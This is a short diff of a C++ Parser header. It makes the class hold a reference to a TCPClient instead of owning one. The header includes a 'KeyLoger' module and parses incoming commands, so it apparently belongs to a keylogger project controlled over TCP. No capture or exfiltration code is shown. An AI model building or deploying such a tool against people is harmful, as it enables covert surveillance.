@@ -1,18 +1,19 @@
 #ifndef PARSER_HPP_
 #define PARSER_HPP_
 
-#include "TCPClient.hpp"
 #include "Protocol.hpp"
 #include "KeyLoger.hpp"
+
+class TCPClient;
 
 class Parser
 {
 public:
-	Parser();
+	Parser(TCPClient &);
 	~Parser();
 	void parseCommands();
 private:
-	TCPClient m_client;
+	TCPClient &m_client;
 	char m_buffer[sizeof(t_cmd)];
 };
 
